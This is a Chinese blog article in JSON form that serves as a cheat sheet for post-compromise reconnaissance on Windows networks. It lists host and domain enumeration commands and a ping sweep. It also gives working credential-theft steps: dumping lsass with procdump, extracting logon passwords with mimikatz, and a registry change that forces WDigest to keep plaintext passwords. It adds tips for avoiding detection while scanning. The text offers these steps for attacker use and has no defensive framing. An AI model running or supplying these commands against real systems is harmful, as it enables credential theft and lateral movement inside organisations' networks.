{"title":"内网-内网信息收集常用命令","slug":"内网-内网信息收集常用命令","date":"2020-02-22T12:30:13.469Z","updated":"2020-02-22T12:35:08.448Z","comments":true,"path":"api/articles/内网-内网信息收集常用命令.json","photos":[],"link":"","excerpt":"收集本机信息常用基本命令​    ipconfig /all​    systeminfo | findstr /B /C:”OS Name” /C:”OS Version”  查询操纵系统和版本，中文的操纵系统 “OS 名称”、”OS 版本”。","covers":null,"content":"<h3 id=\"收集本机信息\"><a href=\"#收集本机信息\" class=\"headerlink\" title=\"收集本机信息\"></a>收集本机信息</h3><h4 id=\"常用基本命令\"><a href=\"#常用基本命令\" class=\"headerlink\" title=\"常用基本命令\"></a>常用基本命令</h4><p>​    ipconfig /all</p>\n<p>​    systeminfo | findstr /B /C:”OS Name” /C:”OS Version”  查询操纵系统和版本，中文的操纵系统 “OS 名称”、”OS 版本”。</p>\n<a id=\"more\"></a>\n\n<p>​    echo %PROCESSOR_ARCHITECTURE%</p>\n<p>​    wmic为WMI（Windows Management Instrumentation windows管理工具）提供一个强大的命令行接口。</p>\n<p>​    wmic service list brief 查询本机服务</p>\n<p>​    tasklist 查询进程列表，使用wmic process list brief</p>\n<p>​    wmic startup get command,caption 查看启动程序信息</p>\n<p>​    schtasks /query /fo LIST /v 查看任务计划</p>\n<p>​    net statistics workstation 查看开机时间</p>\n<p>​    net user 查看用户列表</p>\n<p>​    net user xxx /domain 查看指定用户详细信息</p>\n<p>​    whoami /all 可查看到用户SID</p>\n<p>​    net localgroup administrators 查看管理员组成员</p>\n<p>​    query user || qwinsta 查看当前在线用户</p>\n<p>​    net session 查看会话</p>\n<p>​    net share 查看本机共享资源列表</p>\n<p>​    netstat -ano 查看网络连接</p>\n<p>​    route print、arp -a 查看路由和arp缓存</p>\n<p>​    net time /domain 判断域</p>\n<p>​    …</p>\n<h4 id=\"获取明文密码\"><a href=\"#获取明文密码\" class=\"headerlink\" title=\"获取明文密码\"></a>获取明文密码</h4><p>​    利用procdump先dump出lsass进程内存，再本地利用mimikatz提取。</p>\n<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>​    win7测试可以dump win7上利用mimikatz获取密码成功。win10需要利用任务管理器右键进程创建转储文件，但是mimikatz获取到的是sha1，需要修改注册表让Wdigest Auth保存明文口令，并且需要用户重新登陆才会生效<br>reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f。</p>\n<p>​    运行mimikatz<br>​    mimikatz # privilege::debug<br>​    mimikatz # sekurlsa::minidump lsass.dmp<br>​    mimikatz # sekurlsa::logonPasswords full</p>\n<h3 id=\"探测内网存活主机\"><a href=\"#探测内网存活主机\" class=\"headerlink\" title=\"探测内网存活主机\"></a>探测内网存活主机</h3><h4 id=\"简单方法\"><a href=\"#简单方法\" class=\"headerlink\" title=\"简单方法\"></a>简单方法</h4><p>​    ping 探测存活主机 for /L %I in (1,1,254) DO @ping -w 100 -n 1 192.168.1.%I | findstr “TTL=”   #-w 100 一百毫秒</p>\n<p>​    再补充执行arp -a看看。</p>\n<p>​    …</p>\n<h4 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h4><p>​    1.在内网做了安全防护的情况下如何探测？利用特殊协议？比如smb等等？</p>\n<h3 id=\"内网端口扫描\"><a href=\"#内网端口扫描\" class=\"headerlink\" title=\"内网端口扫描\"></a>内网端口扫描</h3><p>​    使用小众的扫描工具。</p>\n<p>​    使用telnet等。</p>\n<p>​    避免大量扫描。</p>\n<h3 id=\"搜集域相关的基础信息\"><a href=\"#搜集域相关的基础信息\" class=\"headerlink\" title=\"搜集域相关的基础信息\"></a>搜集域相关的基础信息</h3><p>​    net view /domain    查询域</p>\n<p>​    net view /domain:xxx   查询某域内的计算机</p>\n<p>​    net group /domain 查询域内的组</p>\n<p>​    net group “xxx”  /domain 查询组内用户</p>\n<p>​    net accounts /domain 获取密码策略</p>\n<p>​    nltest /domain_trusts 获取域信任信息</p>\n<p>​    nltest /DCLIST:hack 获取DC域控制器列表</p>\n<p>​    net user xxx /domain 获取某个用户的信息</p>\n<p>​    wmic useraccount get /all 获取域内用户的详细信息</p>\n","categories":[],"tags":[]}